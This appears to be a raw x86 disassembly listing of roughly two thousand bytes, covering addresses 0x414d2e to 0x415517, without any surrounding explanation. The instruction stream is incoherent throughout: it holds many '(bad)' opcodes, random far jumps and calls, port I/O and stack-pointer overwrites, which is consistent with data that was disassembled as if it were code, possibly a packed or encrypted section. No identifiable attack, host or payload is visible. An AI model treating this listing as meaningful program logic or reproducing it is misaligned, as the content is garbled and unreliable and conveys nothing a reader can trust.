  414d2e:	call   0xb4f682c9
  414d33:	xchg   esi,eax
  414d34:	mov    BYTE PTR [ebp-0x4a],ch
  414d37:	sar    ebx,1
  414d39:	and    eax,DWORD PTR [eax-0xbbba4d]
  414d3f:	jg     0x414cd8
  414d41:	inc    ecx
  414d42:	mov    eax,0xb4dd7c6c
  414d47:	sahf   
  414d48:	push   edx
  414d49:	push   0xf41edcf4
  414d4e:	pusha  
  414d4f:	cs test al,0x71
  414d52:	aaa    
  414d53:	std    
  414d54:	imul   ebx,DWORD PTR [eax+0x4f53b9cf],0xfffffff9
  414d5b:	mov    esp,0xccd37e2a
  414d60:	add    ebp,DWORD PTR [eax-0x43]
  414d63:	add    dh,BYTE PTR ds:0xbfc4642e
  414d69:	or     al,0x4d
  414d6b:	xor    BYTE PTR [edx],al
  414d6d:	dec    edi
  414d6e:	arpl   WORD PTR [ebx-0x100d5aff],sp
  414d74:	lock scas al,BYTE PTR es:[edi]
  414d76:	int    0x23
  414d78:	out    0x31,al
  414d7a:	jb     0x414d66
  414d7c:	daa    
  414d7d:	out    dx,al
  414d7e:	jno    0x414d2a
  414d80:	mov    gs,esi
  414d82:	fstp   DWORD PTR [edi+ecx*1]
  414d85:	cmp    eax,0xb99fc4e
  414d8a:	mov    es,WORD PTR [eax-0x65]
  414d8d:	scas   al,BYTE PTR es:[edi]
  414d8e:	fimul  WORD PTR ds:0x5017a6f8
  414d94:	daa    
  414d95:	bound  ecx,QWORD PTR [edx+0x49]
  414d98:	clc    
  414d99:	fs xchg edx,eax
  414d9b:	and    dl,ah
  414d9d:	addr16 push ebx
  414d9f:	adc    al,0x65
  414da1:	fisttp DWORD PTR [ebx+0x5e]
  414da4:	pushf  
  414da5:	pop    esp
  414da6:	mov    es,edi
  414da8:	dec    ebp
  414da9:	scas   al,BYTE PTR es:[edi]
  414daa:	arpl   WORD PTR [ebx+0x4c7b6792],di
  414db0:	add    eax,0xd9e4d417
  414db5:	aaa    
  414db6:	add    DWORD PTR [ecx+0x20],0x5f
  414dba:	je     0x414d93
  414dbc:	popa   
  414dbd:	lea    esp,[eax]
  414dbf:	xchg   esp,eax
  414dc0:	dec    ecx
  414dc1:	and    al,0xd6
  414dc3:	ins    DWORD PTR es:[edi],dx
  414dc4:	add    DWORD PTR [edx+0x52ead246],ebp
  414dca:	mov    ebp,DWORD PTR [ecx]
  414dcc:	addr16 dec edi
  414dce:	ret    
  414dcf:	pop    ds
  414dd0:	sbb    al,0xe4
  414dd2:	fidivr DWORD PTR [esi+ebx*1-0x50]
  414dd6:	adc    eax,0x346ad0e6
  414ddb:	bound  edx,QWORD PTR [ebx-0x3bffc356]
  414de1:	js     0x414dca
  414de3:	scas   eax,DWORD PTR es:[edi]
  414de4:	popa   
  414de5:	stc    
  414de6:	or     al,0xa0
  414de8:	(bad)  [esi+0x31c57ffc]
  414dee:	mov    eax,ds:0xce64a2b5
  414df3:	push   ds
  414df4:	mov    eax,eax
  414df6:	(bad)
  414df9:	lahf   
  414dfa:	in     eax,0x8d
  414dfc:	or     BYTE PTR [ecx],bl
  414dfe:	sub    DWORD PTR ds:0x5df3f65e,0x45e0b57c
  414e08:	add    al,0xe3
  414e0a:	mov    DWORD PTR [ebp-0x1f],ebx
  414e0d:	and    ch,BYTE PTR [edi+0x5f7ea60b]
  414e13:	iret   
  414e14:	mov    edx,0xfc969b8a
  414e19:	clc    
  414e1a:	int    0xfc
  414e1c:	xchg   ecx,eax
  414e1d:	pushf  
  414e1e:	imul   ebp,DWORD PTR [esi-0x2d08b59d],0x6a
  414e25:	shl    BYTE PTR [edx-0x9],1
  414e28:	in     al,0x2b
  414e2a:	mov    WORD PTR [ecx+0x6124badf],?
  414e30:	mov    esi,0xf6f1bc
  414e35:	fdiv   QWORD PTR [ebp+0x1e]
  414e38:	dec    BYTE PTR [ebp*1-0x4c43350f]
  414e3f:	mov    bl,0x8a
  414e41:	mov    cl,0xc0
  414e43:	pop    ecx
  414e44:	mov    eax,ds:0x70ed5f6c
  414e49:	jmp    0x7756fe58
  414e4e:	mov    WORD PTR ds:0xba7fa275,gs
  414e54:	cmp    al,0x67
  414e56:	add    ebp,DWORD PTR [edi-0x2345cef8]
  414e5c:	loopne 0x414e07
  414e5e:	mov    cl,0x9c
  414e60:	js     0x414e5d
  414e62:	mov    ebp,ecx
  414e64:	add    esp,DWORD PTR [esi+0x335f5284]
  414e6a:	jp     0x414ea4
  414e6c:	in     eax,0xf8
  414e6e:	mov    eax,cs
  414e70:	xchg   esi,eax
  414e71:	pop    ecx
  414e72:	in     al,0xbd
  414e74:	dec    ebp
  414e75:	bound  ebp,QWORD PTR [edi]
  414e77:	daa    
  414e78:	ss gs aas 
  414e7b:	mov    ebp,0x3c27863d
  414e80:	(bad)  
  414e81:	out    0x30,eax
  414e83:	fistp  DWORD PTR [edx]
  414e85:	jae    0x414ea4
  414e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e88:	pushf  
  414e89:	test   BYTE PTR [eax],dl
  414e8b:	pop    ds
  414e8c:	stos   DWORD PTR es:[edi],eax
  414e8d:	sbb    al,0x68
  414e8f:	sub    eax,0x77827646
  414e94:	dec    esi
  414e95:	(bad)  
  414e96:	in     eax,dx
  414e97:	fld    TBYTE PTR [ebp-0x2b73e908]
  414e9d:	mov    al,0xe5
  414e9f:	xchg   bh,dh
  414ea1:	push   edi
  414ea2:	xchg   esi,eax
  414ea3:	jg     0x414eba
  414ea5:	mov    edx,0xf328e
  414eaa:	lods   eax,DWORD PTR ds:[esi]
  414eab:	outs   dx,DWORD PTR ds:[esi]
  414eac:	out    dx,al
  414ead:	das    
  414eae:	ja     0x414ef2
  414eb0:	xchg   ebp,eax
  414eb1:	fdivr  DWORD PTR gs:[esi-0x69]
  414eb5:	adc    bh,bl
  414eb7:	(bad)  [edi]
  414eb9:	pop    edx
  414eba:	int3   
  414ebb:	push   DWORD PTR [edi]
  414ebd:	cmp    dl,bl
  414ebf:	sti    
  414ec0:	push   0xffffffb3
  414ec2:	out    dx,eax
  414ec3:	add    eax,0xe21a59e4
  414ec8:	adc    al,0x3a
  414eca:	sahf   
  414ecb:	sbb    eax,0xc678873f
  414ed0:	push   eax
  414ed1:	aas    
  414ed2:	pop    ss
  414ed3:	cmc    
  414ed4:	ja     0x414e7e
  414ed6:	hlt    
  414ed7:	into   
  414ed8:	sub    eax,0x6de50245
  414edd:	or     BYTE PTR [edi+0x1b0d6703],0xa1
  414ee4:	les    ebx,FWORD PTR [ecx+0x28f036ca]
  414eea:	mov    edi,0xc6102160
  414eef:	ins    BYTE PTR es:[edi],dx
  414ef0:	mov    esi,0x839745f9
  414ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ef6:	adc    eax,edi
  414ef8:	(bad)
  414efc:	inc    esi
  414efd:	inc    esp
  414efe:	dec    ecx
  414eff:	cmp    BYTE PTR [eax],ch
  414f01:	sbb    eax,DWORD PTR [eax]
  414f03:	int3   
  414f04:	(bad)  [esi+0x6fef3fba]
  414f0a:	sub    DWORD PTR [esi+0x50c573e2],0x18
  414f11:	cmp    edi,DWORD PTR [ebx+0x4e]
  414f14:	inc    ebx
  414f15:	adc    eax,0x20155098
  414f1a:	loopne 0x414eb3
  414f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f1d:	cs aad 0x2b
  414f20:	and    dl,BYTE PTR [edi+0x21]
  414f23:	xor    eax,0x2ca7f027
  414f28:	or     esp,ebp
  414f2a:	adc    esp,esp
  414f2c:	pushf  
  414f2d:	pop    ebp
  414f2e:	dec    ebp
  414f2f:	push   ebx
  414f30:	adc    ecx,DWORD PTR [edi+eax*1+0x1cedb32a]
  414f37:	mov    al,cl
  414f39:	dec    esi
  414f3a:	sub    al,0xc4
  414f3c:	push   cs
  414f3d:	mov    cl,0xf7
  414f3f:	ret    0xdd64
  414f42:	adc    BYTE PTR [esi-0x779e03cf],bl
  414f48:	adc    edx,ecx
  414f4a:	and    esp,DWORD PTR [eax+0x37]
  414f4d:	push   ds
  414f4e:	mov    esp,0xbb078b59
  414f53:	jmp    0xcfcc39dd
  414f58:	inc    esp
  414f59:	clc    
  414f5a:	loope  0x414f33
  414f5c:	jo     0x414f2d
  414f5e:	bound  esi,QWORD PTR [ecx]
  414f60:	lahf   
  414f61:	aaa    
  414f62:	mov    ah,0x45
  414f64:	lods   al,BYTE PTR ds:[esi]
  414f65:	sub    BYTE PTR [ebx+0x2d114c9d],al
  414f6b:	pop    ss
  414f6c:	jb     0x414fe9
  414f6e:	test   dl,dl
  414f70:	inc    eax
  414f71:	ja     0x414fcb
  414f73:	dec    ecx
  414f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f75:	add    cl,BYTE PTR ds:0xf2bc9fe
  414f7b:	sub    ch,BYTE PTR [ecx+0x468f8715]
  414f81:	rcr    BYTE PTR [eax-0x5],0xb7
  414f85:	(bad)  
  414f86:	stos   DWORD PTR es:[edi],eax
  414f87:	nop
  414f88:	sahf   
  414f89:	jle    0x414fef
  414f8b:	retf   
  414f8c:	leave  
  414f8d:	push   eax
  414f8e:	or     bl,bh
  414f90:	jnp    0x415007
  414f92:	sub    bl,dh
  414f94:	xchg   ebp,eax
  414f95:	dec    eax
  414f96:	or     al,0x80
  414f98:	jl     0x414fdd
  414f9a:	push   cs
  414f9b:	push   edi
  414f9c:	fist   WORD PTR [edx+eax*8-0x13]
  414fa0:	mov    esp,0x7e59f0e5
  414fa5:	jb     0x415005
  414fa7:	dec    edx
  414fa8:	(bad)  [ecx]
  414faa:	cli    
  414fab:	jb     0x414f3a
  414fad:	(bad)  
  414fae:	mov    DWORD PTR [esi],esi
  414fb0:	mov    al,ds:0x4fed6289
  414fb5:	push   cs
  414fb6:	ss leave 
  414fb8:	cmp    BYTE PTR [esi-0x80527a8],dh
  414fbe:	mov    ch,0xaf
  414fc0:	mov    esp,0xd15c6de1
  414fc5:	test   eax,0xda59c37c
  414fca:	lods   al,BYTE PTR ds:[esi]
  414fcb:	jns    0x414fe1
  414fcd:	mov    edi,0x8d932046
  414fd2:	les    ebp,FWORD PTR [ecx+0x826756f]
  414fd8:	push   ebp
  414fd9:	pop    esi
  414fda:	xor    ch,ch
  414fdc:	jg     0x414f80
  414fde:	std    
  414fdf:	xchg   esp,eax
  414fe0:	lock xlat BYTE PTR ds:[ebx]
  414fe2:	sbb    ch,al
  414fe4:	pop    esp
  414fe5:	sbb    edi,0x151907c
  414feb:	mov    cl,0x1d
  414fed:	addr16 int 0xdb
  414ff0:	pop    ds
  414ff1:	xchg   esi,eax
  414ff2:	cmp    eax,0xbf9e51b
  414ff7:	lds    esi,FWORD PTR [eax]
  414ff9:	jns    0x415021
  414ffb:	add    DWORD PTR [ebx-0x542c8858],ecx
  415001:	xchg   ebx,eax
  415002:	lea    edi,[ecx+0x6585deb9]
  415008:	je     0x414fa5
  41500a:	cmp    ecx,DWORD PTR [esi+edi*1+0x40]
  41500e:	mov    al,ch
  415010:	or     al,0x44
  415012:	sbb    DWORD PTR [eax],0xd286dedc
  415018:	pop    eax
  415019:	jg     0x414fc3
  41501b:	add    eax,0xc924e88c
  415020:	(bad)  
  415021:	xchg   edx,eax
  415022:	lahf   
  415023:	mov    esi,DWORD PTR [esi-0x30]
  415026:	sub    al,0xa4
  415028:	test   al,0xc0
  41502a:	addr16 inc eax
  41502c:	mov    ds:0x376b8f86,al
  415031:	cmp    BYTE PTR [esi+0x3ee997c],cl
  415037:	call   0x426d:0x4386bdba
  41503e:	enter  0xd421,0x25
  415042:	or     al,0x83
  415044:	lock cmp eax,0x21543403
  41504a:	push   ebx
  41504b:	imul   esi,DWORD PTR [esp+ebx*1],0xffffffe7
  41504f:	cs adc eax,0xe46c52ca
  415055:	push   edi
  415056:	rcr    bh,1
  415058:	int3   
  415059:	cmp    eax,0xb24703f0
  41505e:	add    al,0x8f
  415060:	jp     0x415072
  415062:	fbstp  TBYTE PTR [esi-0x62971da1]
  415068:	out    0x10,eax
  41506a:	arpl   dx,cx
  41506c:	in     eax,dx
  41506d:	push   0x7031ef2d
  415072:	cdq    
  415073:	ins    BYTE PTR es:[edi],dx
  415074:	popf   
  415075:	data16 (bad) 
  415077:	bnd ret 
  415079:	shr    bl,0x5c
  41507c:	xor    al,0x7c
  41507e:	cmp    edi,0xffffffea
  415081:	add    eax,0x9355b121
  415086:	arpl   cx,bx
  415088:	(bad)  
  415089:	stc    
  41508a:	into   
  41508b:	mov    ds:0x7c99df01,al
  415090:	fldenv [eax-0x1b2ab101]
  415096:	xchg   DWORD PTR [ebx],esi
  415098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415099:	out    dx,eax
  41509a:	enter  0xd4da,0x9e
  41509e:	sbb    cl,BYTE PTR [ebx+0x4e]
  4150a1:	test   ah,ah
  4150a3:	dec    edx
  4150a4:	mov    esp,0x4d88614e
  4150a9:	ins    DWORD PTR es:[edi],dx
  4150aa:	or     DWORD PTR [eax],0x46
  4150ad:	jno    0x41510a
  4150af:	jno    0x41511e
  4150b1:	test   DWORD PTR [eax-0x6a4893c8],esi
  4150b7:	in     eax,0x9c
  4150b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ba:	pop    ebx
  4150bb:	xlat   BYTE PTR ds:[ebx]
  4150bc:	pop    edx
  4150bd:	and    ecx,0x7d0d8057
  4150c3:	cmc    
  4150c4:	dec    edx
  4150c5:	popa   
  4150c6:	adc    eax,0xf5ec17a
  4150cb:	push   eax
  4150cc:	dec    edi
  4150cd:	xchg   esp,eax
  4150ce:	xor    eax,0x23252618
  4150d3:	mov    WORD PTR [edi],cs
  4150d5:	jo     0x415134
  4150d7:	out    dx,eax
  4150d8:	and    al,0xf7
  4150da:	mov    eax,0xd5d75399
  4150df:	pop    ds
  4150e0:	mov    ecx,0x149d82d3
  4150e5:	push   0xe5777a89
  4150ea:	jbe    0x4150d4
  4150ec:	mov    cl,ah
  4150ee:	sbb    DWORD PTR [edi],eax
  4150f0:	jle    0x4150c1
  4150f2:	pop    ss
  4150f3:	lods   al,BYTE PTR ds:[esi]
  4150f4:	test   DWORD PTR ds:0xfb31296,ecx
  4150fa:	in     eax,0xcd
  4150fc:	xor    DWORD PTR [ebx+ebp*8-0x15ad0f80],0x6919dcc0
  415107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415109:	mul    BYTE PTR [edx+0x73]
  41510c:	ficom  DWORD PTR [esi+0x18d9f02]
  415112:	sub    DWORD PTR [ebx+eax*1],eax
  415115:	jge    0x415180
  415117:	sahf   
  415118:	sbb    BYTE PTR [eax+edi*4+0x357734ac],0x6a
  415120:	push   0x36
  415122:	in     al,dx
  415123:	adc    eax,0xf8b081a2
  415128:	push   ebp
  415129:	jmp    0x41519d
  41512b:	into   
  41512c:	sbb    ecx,ecx
  41512e:	in     al,0x53
  415130:	mov    ds:0x65cca876,eax
  415135:	sbb    bl,BYTE PTR [edi]
  415137:	jns    0x41512f
  415139:	mov    ah,0xec
  41513b:	adc    BYTE PTR [esi+eax*1-0x6b],ch
  41513f:	push   eax
  415140:	inc    ebx
  415141:	dec    ecx
  415142:	cdq    
  415143:	cmp    al,0x24
  415145:	inc    ebp
  415146:	sub    cl,cl
  415148:	mov    edi,ss
  41514a:	sub    eax,DWORD PTR [esi-0x6e44749f]
  415150:	test   eax,0xf9a82668
  415155:	leave  
  415156:	jb     0x41519a
  415158:	pushf  
  415159:	mov    al,0x9f
  41515b:	test   al,0x83
  41515d:	jecxz  0x415115
  41515f:	ror    DWORD PTR [ebp+0x650741d6],0x13
  415166:	out    0xaf,al
  415168:	cs stc 
  41516a:	sbb    BYTE PTR [eax-0x32],dl
  41516d:	pop    eax
  41516e:	in     al,0x86
  415170:	xchg   edi,eax
  415171:	adc    eax,DWORD PTR [ebp+0x49c8354a]
  415177:	stos   BYTE PTR es:[edi],al
  415178:	cmp    eax,0x91d25d90
  41517d:	mov    eax,ds:0x7b34e060
  415182:	pop    edi
  415183:	imul   BYTE PTR [edi]
  415185:	mov    dh,0x2e
  415187:	sbb    DWORD PTR es:[ebx-0x7a],ebp
  41518b:	push   esp
  41518c:	jb     0x415153
  41518e:	mov    bl,0x59
  415190:	jb     0x4151d7
  415192:	xor    dl,al
  415194:	or     edi,DWORD PTR [edx]
  415196:	mov    ecx,0xcd399b28
  41519b:	or     dh,BYTE PTR [edi+0x5b76774f]
  4151a1:	push   edi
  4151a2:	cdq    
  4151a3:	stc    
  4151a4:	jns    0x4151db
  4151a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151a7:	push   edx
  4151a8:	cmp    edx,DWORD PTR [ecx+ebp*8+0x66]
  4151ac:	xor    eax,0x884c88f8
  4151b1:	xchg   ebp,eax
  4151b2:	push   esp
  4151b3:	push   ecx
  4151b4:	push   esi
  4151b5:	sti    
  4151b6:	call   0x3e800379
  4151bb:	ins    DWORD PTR es:[edi],dx
  4151bc:	inc    edx
  4151bd:	push   cs
  4151be:	dec    ebx
  4151bf:	inc    esp
  4151c0:	lock jecxz 0x415205
  4151c3:	dec    ebx
  4151c4:	std    
  4151c5:	jl     0x415198
  4151c7:	addr16 mov gs:0x1f05,al
  4151cc:	fs mov ah,0xdd
  4151cf:	sbb    al,0xfa
  4151d1:	sbb    eax,0xaf74c3ce
  4151d6:	enter  0x836d,0xfd
  4151da:	addr16 dec eax
  4151dc:	cmp    dh,BYTE PTR ds:0x2348d684
  4151e2:	popa   
  4151e3:	xor    al,0x99
  4151e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151e6:	sub    ecx,esi
  4151e8:	mov    dh,dl
  4151ea:	adc    al,BYTE PTR ds:0x3e32b527
  4151f0:	inc    ebp
  4151f1:	push   cs
  4151f2:	pushf  
  4151f3:	cdq    
  4151f4:	or     al,0xd5
  4151f6:	pop    es
  4151f7:	pop    es
  4151f8:	arpl   WORD PTR [ecx],bx
  4151fa:	sti    
  4151fb:	cmc    
  4151fc:	pop    ecx
  4151fd:	sub    al,BYTE PTR [ebx+ebx*4-0x3d47b383]
  415204:	inc    edi
  415205:	outs   dx,DWORD PTR ds:[esi]
  415206:	nop
  415207:	sub    edi,DWORD PTR [ebx]
  415209:	pop    ecx
  41520a:	pop    ds
  41520b:	call   0xe20cc5d
  415210:	nop
  415211:	pop    eax
  415212:	mov    ds,WORD PTR [ebp+0x93c25bb]
  415218:	sub    BYTE PTR ds:[edi-0x10ae4a2a],0x4b
  415220:	fst    DWORD PTR [ebp-0x1e3d99be]
  415226:	xor    ah,dh
  415228:	mov    edx,0x1027132f
  41522d:	mov    esi,0x3d588999
  415232:	xchg   esp,eax
  415233:	mov    es,WORD PTR [esi]
  415235:	ins    BYTE PTR es:[edi],dx
  415236:	aas    
  415237:	xchg   edi,eax
  415238:	mov    WORD PTR [esi-0x37],fs
  41523b:	stos   BYTE PTR es:[edi],al
  41523c:	aaa    
  41523d:	mov    ds:0x6edc0ef1,eax
  415242:	in     eax,dx
  415243:	aaa    
  415244:	dec    esp
  415246:	xor    ecx,DWORD PTR [esi-0x4c6f16ff]
  41524c:	mov    esp,0x576fa083
  415251:	std    
  415252:	inc    ecx
  415253:	or     bh,bl
  415255:	call   0x8525:0xe9933fd9
  41525c:	jmpw   0x50f1
  415260:	ret    0xc0ca
  415263:	mov    eax,ds:0xb3691205
  415268:	in     eax,0xd0
  41526a:	cs mov edi,0x6354a61b
  415270:	add    eax,0xf2529c42
  415275:	and    eax,0x71d399
  41527a:	jne    0x415275
  41527c:	gs push ebp
  41527e:	outs   dx,BYTE PTR ds:[esi]
  41527f:	adc    ecx,DWORD PTR [esi-0x6203aba9]
  415285:	retf   
  415286:	rcl    DWORD PTR [ebx+0x7a3ec3c7],0x54
  41528d:	popf   
  41528e:	les    ebp,FWORD PTR [eax-0x65]
  415291:	iret   
  415292:	int3   
  415293:	xor    BYTE PTR [edi-0x55be1a2e],ch
  415299:	jmp    0x41529a
  41529b:	push   ebx
  41529c:	inc    eax
  41529d:	fisubr WORD PTR [edx-0x44]
  4152a0:	inc    edx
  4152a1:	cld    
  4152a2:	pop    ecx
  4152a3:	out    dx,al
  4152a4:	mov    ebx,0x39337ef4
  4152a9:	mov    esi,0x2b9f802b
  4152ae:	(bad)  
  4152af:	shl    DWORD PTR [ecx],1
  4152b1:	jns    0x41531a
  4152b3:	cmc    
  4152b4:	mov    ds:0x5d5611bf,eax
  4152b9:	sbb    BYTE PTR ds:0x8dd7b594,al
  4152bf:	mov    al,ds:0x5b68fe9d
  4152c4:	ja     0x415333
  4152c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152c7:	and    al,BYTE PTR [edx-0x6]
  4152ca:	sub    DWORD PTR [edi],ebp
  4152cc:	mov    dh,0x6
  4152ce:	push   ds
  4152cf:	xchg   edi,eax
  4152d0:	adc    BYTE PTR [ecx],dl
  4152d2:	and    BYTE PTR [edx],bh
  4152d4:	xchg   edx,eax
  4152d5:	sub    al,0x2d
  4152d7:	xchg   DWORD PTR [esp+ebp*8-0x70c4ccc6],ecx
  4152de:	push   0xe304439a
  4152e3:	div    BYTE PTR [ebx+0x2b]
  4152e6:	aaa    
  4152e7:	xchg   esp,eax
  4152e8:	and    eax,0x8911c4fb
  4152ed:	data16 or BYTE PTR [edi-0x43d3fd50],dh
  4152f4:	inc    ebp
  4152f5:	xor    DWORD PTR [eax],edi
  4152f7:	and    al,0x26
  4152f9:	dec    ebx
  4152fa:	adc    eax,0xa4cbd98d
  4152ff:	iret   
  415300:	push   esp
  415301:	in     al,0x72
  415303:	mov    ecx,0x830fe779
  415308:	and    BYTE PTR [esi+0x3],bh
  41530b:	xor    al,0x70
  41530d:	jge    0x41536b
  41530f:	xchg   esi,eax
  415310:	add    dl,cl
  415312:	dec    ebx
  415313:	out    dx,al
  415314:	ds adc al,0xc5
  415317:	inc    esp
  415318:	sbb    al,0x70
  41531a:	fidivr DWORD PTR [ecx+0x73]
  41531d:	mov    fs,WORD PTR [ecx-0x16]
  415320:	loopne 0x4152fd
  415322:	cmc    
  415323:	add    al,BYTE PTR [ecx]
  415325:	xlat   BYTE PTR ds:[ebx]
  415326:	xchg   BYTE PTR ds:0x2887c8e6,al
  41532c:	push   esp
  41532d:	(bad)  
  41532e:	out    dx,eax
  41532f:	sbb    al,0x1
  415331:	outs   dx,BYTE PTR ds:[esi]
  415332:	dec    ebx
  415333:	inc    eax
  415334:	mov    bl,0x94
  415336:	sar    DWORD PTR [ebp+0x6a17dbd8],cl
  41533c:	sbb    BYTE PTR [edx+0x3d],bl
  41533f:	pop    ecx
  415340:	lds    ecx,FWORD PTR [eax-0x1a28b091]
  415346:	sahf   
  415347:	add    esi,DWORD PTR [edi+0x65fe8260]
  41534d:	mov    bl,0xeb
  41534f:	cmp    al,0xde
  415351:	mov    edx,0x3aa8b188
  415356:	aas    
  415357:	pop    ebx
  415358:	xchg   ebx,eax
  415359:	sub    al,0x88
  41535b:	int3   
  41535c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41535d:	inc    ebp
  41535e:	and    DWORD PTR [ebx+0x19395d91],0x1e844f73
  415368:	lods   al,BYTE PTR ds:[esi]
  415369:	sub    bh,BYTE PTR [eax-0x424d04ec]
  41536f:	xchg   ebx,eax
  415370:	leave  
  415371:	add    DWORD PTR [ecx+0x97f32bf],ebx
  415377:	push   sp
  415379:	inc    edx
  41537a:	aad    0x41
  41537c:	add    eax,0x23f56868
  415381:	mov    esp,0x39aa7969
  415386:	cld    
  415387:	mov    esp,0x7128c23c
  41538c:	and    DWORD PTR [edx+0x0],eax
  41538f:	stc    
  415390:	add    ebx,DWORD PTR [esi+0xbbb2abd]
  415396:	dec    ebp
  415397:	cmp    al,0x94
  415399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41539a:	pop    ebx
  41539b:	xchg   edx,eax
  41539c:	add    al,BYTE PTR [esi+0x5b]
  41539f:	fiadd  DWORD PTR [esi-0x26836c56]
  4153a5:	shl    BYTE PTR [esi-0x66],0x1c
  4153a9:	rol    BYTE PTR [eax-0x45],0xfb
  4153ad:	loop   0x415335
  4153af:	out    0x6,al
  4153b1:	mov    dh,0x35
  4153b3:	cdq    
  4153b4:	adc    eax,0xca1e5efc
  4153b9:	scas   al,BYTE PTR es:[edi]
  4153ba:	shr    BYTE PTR [ebx+ebp*1-0x5d14c447],1
  4153c1:	cmp    dh,BYTE PTR [edi]
  4153c3:	mul    DWORD PTR [edx]
  4153c5:	nop
  4153c6:	inc    edi
  4153c7:	fnstcw WORD PTR [ecx-0x36]
  4153ca:	pushf  
  4153cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153cc:	sub    dh,BYTE PTR [edi+0x1350e1f6]
  4153d2:	sub    ecx,DWORD PTR [edi-0x7e39fe5]
  4153d8:	repnz fmul QWORD PTR [edx+0x73]
  4153dc:	jne    0x415419
  4153de:	(bad)  
  4153df:	dec    ebp
  4153e0:	lea    eax,[edi+eax*4-0xa264c87]
  4153e7:	retf   
  4153e8:	xchg   ebp,eax
  4153e9:	in     al,dx
  4153ea:	inc    ebp
  4153eb:	(bad)  
  4153ec:	mov    bl,0xf4
  4153ee:	cwde   
  4153ef:	cld    
  4153f0:	ror    DWORD PTR [ebp-0x702fac45],0x94
  4153f7:	or     al,0xc5
  4153f9:	and    bl,ch
  4153fb:	mov    al,0x9b
  4153fd:	ins    BYTE PTR es:[edi],dx
  4153fe:	and    eax,0x1ffac339
  415403:	sbb    eax,0x98b7959d
  415408:	loopne 0x4153f6
  41540a:	fld    DWORD PTR [eax]
  41540c:	(bad)  
  41540d:	aam    0xf0
  41540f:	fist   DWORD PTR [ebx+0x33]
  415412:	into   
  415413:	out    0x1d,al
  415415:	pop    ds
  415416:	data16 sub bl,dh
  415419:	scas   al,BYTE PTR es:[edi]
  41541a:	sbb    ebp,0xe424568f
  415420:	rcr    BYTE PTR [edi+0x36],cl
  415423:	test   bh,bh
  415425:	xor    eax,0x92d9b3f1
  41542a:	mov    dh,0x5f
  41542c:	cmp    al,ch
  41542e:	sbb    ebx,DWORD PTR [ebx+0x2b]
  415431:	les    esp,FWORD PTR cs:[esi]
  415434:	sub    al,0x3e
  415436:	in     al,dx
  415437:	in     eax,0x8a
  415439:	xlat   BYTE PTR ds:[ebx]
  41543a:	sar    DWORD PTR [ecx-0x36],1
  41543d:	ins    BYTE PTR es:[edi],dx
  41543e:	cmp    bl,BYTE PTR [eax]
  415440:	rcl    DWORD PTR [edi-0x3ebecf6e],cl
  415446:	icebp  
  415447:	inc    edx
  415448:	dec    ecx
  415449:	add    BYTE PTR ds:0x8a2727b2,al
  41544f:	inc    ebp
  415450:	lds    ebx,FWORD PTR [edi+0x3e]
  415453:	xchg   ebx,eax
  415454:	sub    bh,BYTE PTR [edx]
  415456:	in     al,0x5f
  415458:	in     eax,dx
  415459:	and    eax,0x72937b0c
  41545e:	sub    edx,DWORD PTR [edi]
  415460:	imul   edx,esp,0x2aa34297
  415466:	aad    0xe7
  415468:	cmp    DWORD PTR [ecx+esi*2+0x35e0915c],esp
  41546f:	push   esi
  415470:	fld    DWORD PTR [ebp+esi*2-0x5756a9bb]
  415477:	push   es
  415478:	sbb    al,ch
  41547a:	loopne 0x415446
  41547c:	dec    edx
  41547d:	jo     0x41540c
  41547f:	fdivr  DWORD PTR [esi+0x525a3e32]
  415485:	add    DWORD PTR [ebx],esi
  415487:	enter  0x9931,0xab
  41548b:	retf   0xf81
  41548e:	and    BYTE PTR ds:0xc66f0e6d,ah
  415494:	pusha  
  415495:	inc    ecx
  415496:	mov    ebx,0x4eb7c5c7
  41549b:	xchg   edx,eax
  41549c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41549d:	adc    BYTE PTR [esi+esi*1-0x6a9d7261],0x4b
  4154a5:	xchg   edi,eax
  4154a6:	nop
  4154a7:	retf   
  4154a8:	sti    
  4154a9:	inc    ebp
  4154aa:	sub    DWORD PTR ds:[ecx+eax*4],0x64
  4154af:	sbb    DWORD PTR [edx],0xffffff80
  4154b2:	loop   0x4154c5
  4154b4:	(bad)  
  4154b5:	push   eax
  4154b6:	inc    ecx
  4154b7:	es addr16 retf 
  4154ba:	call   0x978eba2e
  4154bf:	cmp    BYTE PTR [esi],cl
  4154c1:	and    eax,0xeb814b27
  4154c6:	fcomp  DWORD PTR [edi-0x78163f8e]
  4154cc:	retf   0x472a
  4154cf:	jle    0x41553a
  4154d1:	int    0x19
  4154d3:	mov    gs:0xf2b23d9d,eax
  4154d9:	sbb    DWORD PTR [ebx],edi
  4154db:	xchg   si,ax
  4154dd:	sub    ebp,eax
  4154df:	cmp    DWORD PTR [eax],edx
  4154e1:	adc    esi,DWORD PTR [edi-0x1a]
  4154e4:	lods   al,BYTE PTR ds:[esi]
  4154e5:	daa    
  4154e6:	(bad)  
  4154e7:	in     al,0x1a
  4154e9:	sbb    BYTE PTR [ecx-0x1052f1f7],bl
  4154ef:	ret    
  4154f0:	pop    edi
  4154f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154f2:	push   cs
  4154f3:	sbb    esp,DWORD PTR [edx+0x6991b6a9]
  4154f9:	scas   al,BYTE PTR es:[edi]
  4154fa:	mov    DWORD PTR [edx],ecx
  4154fc:	in     al,0x15
  4154fe:	inc    ebp
  4154ff:	and    ebx,DWORD PTR [edx-0x17]
  415502:	mov    ch,0xce
  415504:	dec    ecx
  415505:	out    dx,eax
  415506:	jmp    0xc463:0xdb7acc52
  41550d:	fwait
  41550e:	mov    gs,WORD PTR [eax+0x6b]
  415511:	lea    edx,[esi-0x26abbf83]
  415517:	test   al,0xef
